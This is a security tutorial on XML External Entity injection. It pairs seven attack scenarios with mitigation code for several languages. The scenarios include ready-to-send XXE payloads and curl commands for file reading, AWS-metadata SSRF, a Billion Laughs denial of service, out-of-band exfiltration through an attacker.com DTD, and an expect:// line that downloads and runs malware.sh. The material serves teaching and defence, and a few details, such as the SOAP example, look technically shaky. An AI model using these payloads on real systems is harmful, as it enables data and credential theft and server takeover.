# XML External Entity

XML External Entity (XXE) injection is a vulnerability that occurs when an application accepts untrusted XML input and its XML parser is configured to process external entities without validation. This allows attackers to reference external files, URLs, and resources to steal data, perform server-side request forgery (SSRF), execute code, or cause denial of service.

The vulnerability exploits a legitimate XML feature (external entities) that's meant to include external content. When misconfigured, it becomes a weapon for accessing sensitive data and system resources.

***

### Real-World Attack Scenarios

#### Scenario 1: Reading Local Files via In-Band XXE

An application allows users to upload XML documents for processing:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**How it works:**

1. The attacker crafts an XML document with a DOCTYPE declaration
2. Inside the DOCTYPE, they define an ENTITY that references a local file using `file://`
3. The entity `&xxe;` is referenced in the XML content
4. The XML parser resolves the entity and includes the file's contents
5. The application returns the file contents in its response

**The response reveals:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/sys:/usr/sbin/nologin
```

The attacker now has user information and can attempt privilege escalation.

**Finding it:** Test XML endpoints with XXE payloads. Check if external entities are processed. Look for file paths in responses. Try accessing sensitive files like /etc/passwd, /etc/shadow, config files.

**Exploit:**

```bash
# Send XXE payload via XML file upload or API
curl -X POST http://example.com/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

# If vulnerable, response contains file contents
```

***

#### Scenario 2: SSRF Attack via XXE

An application processes XML documents and accesses URLs specified in external entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal-api.company.local/admin/users">
]>
<foo>&xxe;</foo>
```

**The attack:**

The attacker references an internal API endpoint that's only accessible from the server. The XML parser makes the request from the server's perspective, bypassing firewall restrictions.

**What the attacker can access:**

* Internal APIs on localhost:8080, localhost:5432, etc.
* AWS metadata service: <http://169.254.169.254/latest/meta-data/>
* Docker metadata: <http://localhost:2375/>
* Kubernetes API: <http://localhost:10250/>
* Internal databases
* Admin panels on internal networks

**AWS Metadata Example:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role">
]>
<foo>&xxe;</foo>
```

This returns AWS credentials:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:23:45Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2024-01-15T16:23:45Z"
}
```

The attacker now has AWS credentials and can access the entire cloud infrastructure.

**Finding it:** Test XXE with internal IP addresses (localhost, 127.0.0.1, 192.168.\*). Try accessing metadata services. Check for cloud credentials in responses. Test common internal ports (5432 for PostgreSQL, 3306 for MySQL, 6379 for Redis).

**Exploit:**

```bash
# Test SSRF via XXE
curl -X POST http://example.com/process-xml \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<foo>&xxe;</foo>'

# Or target AWS metadata
curl -X POST http://example.com/process-xml \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>'
```

***

#### Scenario 3: Blind XXE with Out-of-Band Data Exfiltration

The application processes XML but doesn't return the content directly. Attacker uses DNS or HTTP callbacks to exfiltrate data:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&exfil;</foo>
```

The attacker hosts an evil DTD file on their server (evil.dtd):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/steal?data=%file;'>
%send;">
%all;
```

**What happens:**

1. The application processes the XML with the external DTD reference
2. The DTD reads the local file (/etc/passwd)
3. The DTD encodes the file contents into a URL
4. The DTD makes a request to attacker.com with the file contents as a parameter
5. The attacker receives the data in their web server logs

**Attacker's web server logs show:**

```
GET /steal?data=root:x:0:0:root:/root:/bin/bash HTTP/1.1
GET /steal?data=daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin HTTP/1.1
GET /steal?data=bin:x:2:2:bin:/bin:/usr/sbin/nologin HTTP/1.1
```

**Why it's effective:**

* Works even if the application doesn't return XML responses
* Works behind WAF/IDS that blocks direct file access
* Exfiltrates data over DNS (harder to detect)
* Combines XXE with external DTD processing

**Finding it:** Test with out-of-band callbacks. Set up Burp Collaborator or similar. Send XXE payloads with external DTD references. Monitor for DNS/HTTP callbacks. Check if blind XXE is possible even without direct responses.

**Exploit:**

```bash
# Attacker hosts evil.dtd on attacker.com
# evil.dtd reads files and sends them to attacker-controlled server

# Send XXE payload that references the external DTD
curl -X POST http://example.com/upload-xml \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&exfil;</foo>'

# Attacker receives callback with file contents
```

***

#### Scenario 4: Denial of Service — Billion Laughs Attack

An attacker crafts an XML document with exponentially expanding entities:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

**What happens:**

* `lol` = 3 bytes
* `lol2` = 3 × 10 = 30 bytes
* `lol3` = 30 × 10 = 300 bytes
* `lol4` = 300 × 10 = 3,000 bytes
* `lol5` = 3,000 × 10 = 30,000 bytes

Each expansion multiplies by 10. In reality, with deeper nesting, this reaches gigabytes or terabytes of data, consuming all server memory and CPU.

**Result:**

* Server runs out of memory
* CPU usage spikes to 100%
* Application becomes unresponsive
* Server crashes
* Legitimate users can't access the application

**Finding it:** Test with exponentially expanding entity payloads. Monitor CPU and memory usage when sending XXE payloads. Try to crash the application with billion laughs attack.

**Exploit:**

```bash
# Send billion laughs payload
curl -X POST http://example.com/upload-xml \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>'

# Server memory/CPU spikes, becomes unresponsive
```

***

#### Scenario 5: Remote Code Execution via XXE

If the server has PHP with the expect module enabled, XXE can execute commands:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

**Result:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The attacker can now execute arbitrary commands on the server.

**Other RCE vectors:**

* Java JNDI injection via XXE
* Python pickle deserialization
* Ruby object injection
* Custom deserialization handlers

**Realistic scenario:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://wget http://attacker.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh">
]>
<foo>&xxe;</foo>
```

Downloads and executes malware from attacker's server.

**Finding it:** Test for RCE with XXE. Use expect:// protocol in payloads. Try common command execution protocols. Check application behavior and error messages.

***

#### Scenario 6: XXE in SOAP/Web Services

Web services often accept XML SOAP requests:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUserRequest>
      <UserId>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        &xxe;
      </UserId>
    </GetUserRequest>
  </soap:Body>
</soap:Envelope>
```

**SOAP services are common targets because:**

* XML processing is mandatory
* External entity processing often enabled by default
* SOAP parsers less frequently patched
* Legacy systems often use SOAP

**Finding it:** Test SOAP endpoints with XXE. Inject payloads in SOAP request bodies. Check WSDL files for hints about XML processing.

***

#### Scenario 7: XXE via File Upload (SVG, PDF, Word)

Applications accepting rich document uploads often process XML:

**SVG File Example:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Office Document (.docx/.xlsx):** These are ZIP files containing XML. Extract and modify internal XML:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

**PDF with embedded XML:** PDFs can contain embedded XML streams vulnerable to XXE.

**Finding it:** Upload XML-based file formats (SVG, DOCX, XLSX, PDF). Test if XXE is processed. Check for blind XXE if no direct output.

***

### Mitigation Strategies

**Disable external entity processing (recommended)**

**PHP:**

```php
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->load('file.xml');
```

**Java:**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**Python:**

```python
from defusedxml import ElementTree as ET
tree = ET.parse('file.xml')
```

**C#/.NET:**

```csharp
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;
doc.Load("file.xml");
```

**Node.js:**

```javascript
const libxmljs = require('libxmljs');
const doc = libxmljs.parseXml(xml, {
  dtdload: false,
  noent: false,
  nocdata: false
});
```

**Use whitelisting for DTD** If DTD is required, whitelist allowed DOCTYPE declarations:

```php
$allowed_dtds = ['http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'];

if ($dtd && !in_array($dtd, $allowed_dtds)) {
    throw new Exception("DTD not allowed");
}
```

**Validate and sanitize input**

* Check file size before processing
* Validate XML schema before parsing
* Reject unexpected DOCTYPE declarations
* Use XML schema validation

**Use safer alternatives**

* Use JSON instead of XML when possible
* If XML required, use JSON with embedded XML
* Use fixed, well-defined schemas

**WAF and IDS rules**

* Block DOCTYPE declarations
* Block ENTITY declarations
* Block SYSTEM keywords in XML
* Monitor for XXE patterns

**Regular security testing**

* Include XXE tests in pentesting
* Scan for vulnerable XML parsers
* Test third-party libraries
* Monitor for new XXE variants

***

{% embed url="<https://cwe.mitre.org/data/definitions/611.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/827.html>" %}

{% embed url="<https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>" %}

{% embed url="<https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>" %}

{% embed url="<https://www.invicti.com/learn/xml-external-entity-xxe>" %}
